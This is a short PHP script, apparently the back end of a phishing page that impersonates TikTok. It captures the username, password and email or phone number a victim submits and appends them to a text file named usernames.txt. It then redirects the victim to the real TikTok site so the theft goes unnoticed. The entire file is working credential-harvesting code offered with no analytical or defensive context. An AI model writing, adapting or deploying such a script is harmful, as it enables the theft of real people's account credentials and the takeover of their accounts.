<?php

file_put_contents("usernames.txt", "Tiktok Username: " . $_POST['username'] . " Pass: " . $_POST['password']  . " Email or phone:" . $_POST['email']
. "\n", FILE_APPEND);
header('Location: https://www.tiktok.com/');
exit();
?>